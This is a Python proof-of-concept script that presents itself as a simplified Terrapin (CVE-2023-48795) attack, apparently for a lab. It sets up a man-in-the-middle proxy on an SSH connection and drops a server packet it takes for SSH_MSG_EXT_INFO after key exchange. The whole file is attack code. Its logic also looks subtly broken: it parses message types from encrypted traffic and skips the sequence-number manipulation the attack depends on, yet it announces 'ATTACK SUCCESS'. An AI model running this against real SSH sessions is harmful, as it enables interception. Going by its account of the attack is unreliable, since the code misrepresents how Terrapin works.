#!/usr/bin/env python3
"""
Simplified Terrapin Attack Demonstration
Manual POC that shows the attack concept without strict vulnerability checks
"""

import socket
import threading
import struct
import argparse
import sys

# SSH Message Types
SSH_MSG_EXT_INFO = 7
SSH_MSG_NEWKEYS = 21

class SimpleTerrapinProxy:
    """Simplified MITM proxy for demonstrating Terrapin attack"""
    
    def __init__(self, target_host, target_port, listen_port):
        self.target_host = target_host
        self.target_port = target_port
        self.listen_port = listen_port
        self.packets_dropped = 0
        self.newkeys_seen = False
        
    def start(self):
        """Start the MITM proxy"""
        print("="*60)
        print("TERRAPIN ATTACK - MANUAL DEMONSTRATION")
        print("CVE-2023-48795")
        print("="*60)
        print(f"\n[*] Starting proxy on port {self.listen_port}")
        print(f"[*] Target: {self.target_host}:{self.target_port}")
        print(f"\n[*] Waiting for SSH client to connect...")
        print(f"    Connect with: ssh -p {self.listen_port} testuser@localhost")
        print(f"    Password: password123\n")
        
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind(('0.0.0.0', self.listen_port))
        server_sock.listen(1)
        
        try:
            client_sock, addr = server_sock.accept()
            print(f"[+] Client connected from {addr}")
            
            # Connect to target server
            target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_sock.connect((self.target_host, self.target_port))
            print(f"[+] Connected to {self.target_host}:{self.target_port}")
            print("\n" + "="*60)
            print("MONITORING SSH HANDSHAKE...")
            print("="*60 + "\n")
            
            # Start forwarding threads
            t1 = threading.Thread(target=lambda: self.forward(client_sock, target_sock, "Client->Server"))
            t2 = threading.Thread(target=lambda: self.forward(target_sock, client_sock, "Server->Client", True))
            
            t1.daemon = True
            t2.daemon = True
            
            t1.start()
            t2.start()
            
            t1.join()
            t2.join()
            
        except KeyboardInterrupt:
            print("\n\n[*] Attack stopped by user")
        except Exception as e:
            print(f"\n[!] Error: {e}")
        finally:
            server_sock.close()
            
    def forward(self, src, dst, direction, monitor_ext_info=False):
        """Forward data and optionally drop EXT_INFO"""
        try:
            while True:
                data = src.recv(8192)
                if not data:
                    break
                
                # Simple packet inspection
                if len(data) > 5:
                    try:
                        msg_type = data[5]
                        
                        if msg_type == SSH_MSG_NEWKEYS:
                            print(f"[INFO] {direction}: SSH_MSG_NEWKEYS detected")
                            self.newkeys_seen = True
                        
                        # Attack: Drop EXT_INFO after NEWKEYS
                        if monitor_ext_info and self.newkeys_seen and msg_type == SSH_MSG_EXT_INFO:
                            print(f"\n{'='*60}")
                            print(f"🎯 ATTACK SUCCESS!")
                            print(f"{'='*60}")
                            print(f"[ATTACK] Dropping SSH_MSG_EXT_INFO packet from server!")
                            print(f"[ATTACK] Packet size: {len(data)} bytes")
                            print(f"[ATTACK] This removes SSH security extensions")
                            print(f"{'='*60}\n")
                            self.packets_dropped += 1
                            # Don't forward - DROP THE PACKET!
                            continue
                            
                    except:
                        pass
                
                # Forward the packet
                dst.send(data)
                
        except Exception as e:
            pass

def main():
    parser = argparse.ArgumentParser(description='Terrapin Attack Manual Demo')
    parser.add_argument('--target', default='vulnerable-server', help='Target SSH server')
    parser.add_argument('--port', type=int, default=22, help='Target SSH port')
    parser.add_argument('--proxy-port', type=int, default=2222, help='Proxy listen port')
    
    args = parser.parse_args()
    
    proxy = SimpleTerrapinProxy(args.target, args.port, args.proxy_port)
    proxy.start()
    
    if proxy.packets_dropped > 0:
        print(f"\n✅ Attack successful! Dropped {proxy.packets_dropped} EXT_INFO packet(s)")
    else:
        print(f"\n⚠️  No EXT_INFO packets were dropped")

if __name__ == '__main__':
    sys.exit(main())
